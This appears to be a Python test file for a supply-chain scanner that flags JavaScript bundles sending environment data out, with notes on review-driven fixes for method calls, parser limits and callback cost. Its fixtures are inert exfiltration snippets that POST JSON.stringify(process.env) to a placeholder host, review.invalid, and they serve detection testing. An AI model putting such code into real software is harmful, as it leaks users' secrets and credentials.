"""BIG-BUNDLE-TAIL (0.1.9), the external review of Oct 20 (REVIEW - FP-GITHUB-SCRIPT v2 and BIG-BUNDLE-TAIL.md):

2. A second function of a method's name: `a.send(data)` was not followed at all where another object had a `send`
   of its own, so a real send was lost wherever the text follower answered. A member's call now gives the data to
   every function of its name (the tree, which resolves a receiver, is precise where it reads the text).
3. A file the supply-chain tree did not read whole: the parser refused it (500 nested brackets, valid JavaScript) or
   the model's budget ran out (a function of 10,000 declarations), and the text follower, which cannot follow a helper
   that returns the environment to a call a megabyte on, was quiet: the action was OK. Now the file is SC-TRUNCATED
   (CRITICAL) in the tree's words, beside whatever the follower found, in the code that runs (the import-time code, an
   install script); the follower's quiet answer never clears it.
4. Callbacks: 3,000 callbacks of one function, each with its own `data`, took the follower 9 seconds whatever its
   budget, 8,000 past 45. Its reading of them is linear now, and charged to the call's budget; with the scan's
   deadline at one second, the action scan of them ends in time.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import time
import unittest
from unittest import mock

from lazaret.scanner import _native, core, engine
from tests.registry import _bundle_support as bb

NESTING = "const nesting=" + "[" * 500 + "0" + "]" * 500 + ";\n"
FETCH = "fetch('https://review.invalid/collect',{method:'POST',body:payload});\n"
TREE_CUT = "the supply-chain tree did not read it whole: "
CRITICAL_RISK = ("SC-IMPORT-RISK", "CRITICAL")


def member_send(n):
    """The review's member-send-{1,2}.js: `a.send(data)`, and n - 1 other objects with a benign `send`."""
    others = "".join("const b%d = {send: function send(data) { return data; }};\n" % k for k in range(n - 1))
    return ("const a = {send: function send(data) {\n  fetch('https://review.invalid/collect', {method:'POST', body:data});\n}};\n"
            + others + "function main() {\n  const data = JSON.stringify(process.env);\n  a.send(data);\n}\nmain();\n")


def member_return(n):
    """A method returning its variable `data`, which a variable `data` of a function is given (FP-GITHUB-SCRIPT's
    same-name rule: core's reading reached it by the name), and n - 1 other classes' methods of its name returning
    their own `data`: BIG-BUNDLE-TAIL followed the method only where no other function had its name."""
    others = "".join("class T%d { grab() { const data = 'x'; return data; } }\n" % k for k in range(n - 1))
    return ("class S { grab() { const data = JSON.stringify(process.env); return data; } }\n" + others
            + "function main(s) { const data = s.grab(); fetch('https://review.invalid/collect', {method:'POST', body:data}); }\n"
            "main(new S());\n")


def far_helper():
    """The review's far-helper.js: module 9001's diag() returns the environment, module 99 a megabyte on sends it."""
    return bb.bundle(2_050_000, helper="exports.diag = function diag(){const all=JSON.stringify(process.env);return all;};\n",
                     code="const core=__nccwpck_require__(9001); const payload=core.diag(); " + FETCH, at=0.5,
                     main="__nccwpck_require__(99);\n")


STRESS = ("function stress(flag){\n" + "".join("let a%d=0;\n" % k for k in range(10000))
          + "".join("if(flag){a%d=1;}\n" % k for k in range(10000)) + "return a0;}\nstress(false);\n")


def callbacks(n):
    """The review's callback-cost-N.js: a function calls its callback 1,000 times, given n callbacks named `data`."""
    return ("function invoke(cb){\n" + "cb(process.env);\n" * 1000 + "}\n"
            + "invoke(data=>fetch('https://review.invalid/x',{method:'POST',body:JSON.stringify(data)}));\n" * n)


def rules(issues):
    return sorted({(r, s) for r, s, _ in issues})


class MemberTests(unittest.TestCase):
    def test_a_methods_call_reaches_each_function_of_its_name(self):
        for n in (1, 2, 3):
            with self.subTest(definitions=n):
                self.assertEqual(core.local_data_sent_at(member_send(n))[1:], ("environment", "the whole environment", False))
                verdict, issues = bb.action_issues(NESTING + member_send(n))
                self.assertEqual(verdict, "SUSPICIOUS")
                self.assertIn(CRITICAL_RISK, rules(issues))
        for n in (1, 2):
            with self.subTest(returns=n):
                self.assertEqual(core.local_data_sent_at(member_return(n))[1:], ("environment", "the whole environment", False))


class UnreadTreeTests(unittest.TestCase):
    def test_a_refused_bundle_is_truncated_beside_the_followers_answer(self):
        text = NESTING + far_helper()
        self.assertEqual(core.js_refusal(text), (1, "nesting too deep"))
        verdict, issues = bb.action_issues(text)
        self.assertEqual(verdict, "INCOMPLETE")
        cut = [m for r, s, m in issues if (r, s) == ("SC-TRUNCATED", "CRITICAL")]
        self.assertEqual(len(cut), 1, issues)
        self.assertIn(TREE_CUT + "the parser refused it at line 1 (nesting too deep)", cut[0])
        # read by the tree, the same bundle is CRITICAL
        self.assertEqual(bb.action_issues(far_helper())[0], "SUSPICIOUS")

    def test_a_bundle_past_the_models_budget_is_truncated(self):
        text = STRESS + far_helper()
        self.assertIsNone(core.js_refusal(text))
        self.assertEqual(_native.call("local_data_sent_tree", {"lang": "js"}, text), "unread")
        reasons, line, refused, unread = engine.import_time_risks([(text, "js")], refused=True, unread=True)[0]
        self.assertIsNone(refused)
        self.assertTrue(unread.startswith(TREE_CUT + "the JavaScript cross-file pass stopped"), unread)
        verdict, issues = bb.action_issues(text)
        self.assertEqual(verdict, "INCOMPLETE")
        self.assertIn(("SC-TRUNCATED", "CRITICAL"), rules(issues))

    def test_a_refused_install_script_is_truncated_beside_its_reasons(self):
        reasons, unread = engine.install_script_risk(NESTING + member_send(2), lang="js", unread=True)
        self.assertTrue(reasons)
        self.assertTrue(unread.startswith(TREE_CUT), unread)
        # asked without `unread`, the call is one the engine could not answer, in the tree's words
        with self.assertRaises(_native.NativeExhausted) as raised:
            engine.install_script_risk(NESTING + member_send(2), lang="js")
        self.assertTrue(engine.exhausted_why(raised.exception).startswith(TREE_CUT))

    def test_a_dependencys_file_is_truncated_beside_its_finding(self):
        found, agent, unread = engine.dep_file_issues([(NESTING + member_send(2), "js", None, "node_modules/x/index.js")])[0]
        issue = engine._issues("node_modules/x/index.js", [found])[0]
        self.assertEqual((issue["rule"], issue["sev"]), CRITICAL_RISK)
        self.assertTrue(unread.startswith(TREE_CUT), unread)
        # code the parser refuses that no runtime runs: no truncation (the answer's two elements, as before)
        self.assertEqual(len(engine.dep_file_issues([(member_send(2) + "\nfunction refused( {\n", "js", None)])[0]), 2)


class CallbackTests(unittest.TestCase):
    def test_callbacks_are_read_in_linear_time_within_the_budget(self):
        for n in (3000, 8000):
            with self.subTest(callbacks=n):
                start = time.process_time()
                self.assertEqual(core.local_data_sent_at(callbacks(n))[1], "environment")
                self.assertLess(time.process_time() - start, 5)
                with self.assertRaises(_native.NativeExhausted):
                    _native.call("local_data_sent_at", {"budget": 1_000_000}, callbacks(n))
        # past the parser's bound, through the action scan: CRITICAL, and the tree's not reading it said
        verdict, issues = bb.action_issues(NESTING + callbacks(3000), rules=("SC-IMPORT-RISK", "SC-TRUNCATED", "SC-NESTED-CODE"))
        self.assertEqual(rules(issues), [("SC-IMPORT-RISK", "CRITICAL"), ("SC-NESTED-CODE", "MAJOR"), ("SC-TRUNCATED", "CRITICAL")])

    def test_a_short_deadline_ends_the_scan_in_time(self):
        # the review's cost-deadline-1s cases: the refusal prefix and 3,000 or 8,000 callbacks, the scan's deadline one
        # second (it is checked between the engine's calls, which are bounded by their budget)
        for n in (3000, 8000):
            with self.subTest(callbacks=n), mock.patch.object(bb.repo, "SCAN_TIMEOUT", 1):
                start = time.process_time()
                verdict, issues = bb.action_issues(NESTING + callbacks(n))
                self.assertLess(time.process_time() - start, 10)
                self.assertTrue(verdict == "INCOMPLETE" or any(s == "CRITICAL" for _, s, _ in issues), (verdict, issues))


if __name__ == "__main__":
    unittest.main()
